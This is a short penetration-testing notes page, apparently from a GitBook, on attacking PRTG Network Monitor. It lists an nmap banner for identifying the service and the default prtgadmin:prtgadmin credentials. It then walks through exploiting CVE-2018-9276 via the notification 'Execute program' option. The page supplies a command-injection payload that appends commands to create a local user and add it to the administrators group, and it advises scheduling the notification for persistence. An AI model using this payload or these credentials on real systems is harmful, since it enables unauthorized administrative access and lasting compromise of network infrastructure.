# PRTG Network Monitor

PRTG is an agentless network monitor.

### Discovery/Footprinting/Enumeration

Typically easily identified with an nmpa scan:&#x20;

```shell-session
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
```





### Default Credentials

prtgadmin:prtgadmin

### Known Vulnerabilities&#x20;

CVE-2018-9276

{% embed url="https://codewatch.org/2018/06/25/prtg-18-2-39-command-injection-vulnerability/" %}

Setup -> Account Settings -> Notifications

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Add new notification

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

Select options:

1. Execute program
2. Program file: Demo exe notification - outfile.ps1
3. Parameter - Add your commands you want executed&#x20;
   1. ```
      test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
      ```
4. Consider scheduling notification to run and execute at intervals in the future for persistence&#x20;
5. Click "test" to execute&#x20;

Note: If your payload is not executing, you can go to Log Entries for possible clues on troubleshooting your payload:&#x20;

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
